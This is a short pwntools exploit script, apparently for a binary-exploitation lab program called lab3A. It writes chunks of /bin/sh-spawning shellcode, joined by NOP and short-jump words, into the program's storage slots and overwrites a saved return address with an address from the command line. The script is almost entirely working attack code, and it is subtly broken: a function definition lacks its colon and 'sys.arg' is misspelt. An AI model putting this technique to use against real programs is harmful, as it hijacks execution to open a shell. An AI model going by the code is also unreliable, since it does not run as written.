from pwn import *

def store(p,val,idx)
    p.sendline("store")
    p.recv(100)
    p.sendline(str(val))
    p.recv(100)
    p.sendline(str(idx))
    print(p.recv(100))
p=process("./lab3A")
p.recv(1000)
addr=int(sys.arg[1],16)
store(p, addr,109)
store(p, 0x90909090, 1)
store(p, 0x04eb9090, 2)
 
store(p, 0x90909090, 4)
store(p, 0x04eb9090, 5)
 
store(p, 0x90909090, 7)
store(p, 0x04eb9090, 8)
 
store(p, 0x90909090, 10)
store(p, 0x04eb9090, 11)
 
store(p, 0x90909090, 13)
store(p, 0x04eb9090, 14)

store(p, 0x90909090, 16)
store(p, 0x04eb9090, 17)

store(p, 0x90909090, 19)
store(p, 0x04eb9090, 20)

store(p,0x9050c031,22)
store(p,0x04eb9090,23)

store(p,0x732f2f68,25)
store(p,0x04eb9068,26)

store(p,0x69622f68,28)
store(p,0x04eb906e,29)

store(p,0xc189e389,31)
store(p,0x04ebc289,32)

store(p,0x80cd0bb0,34)

